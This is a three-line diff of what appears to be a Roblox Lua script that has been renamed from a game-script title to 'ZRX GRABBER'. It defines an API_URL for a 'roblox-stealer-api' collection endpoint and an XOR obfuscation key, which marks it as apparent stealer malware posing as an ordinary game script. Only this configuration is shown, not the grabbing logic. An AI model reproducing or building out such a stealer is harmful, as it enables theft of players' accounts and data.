@@ -1,4 +1,4 @@
--- Cursed On Top (Hann Scripts)
+-- ZRX GRABBER
 local API_URL = "https://roblox-stealer-api.vercel.app/api/data"
 local XOR_KEY = "Nr46WdKC2kQXvmLQgNDRtAwlkftEb4qtk"
 
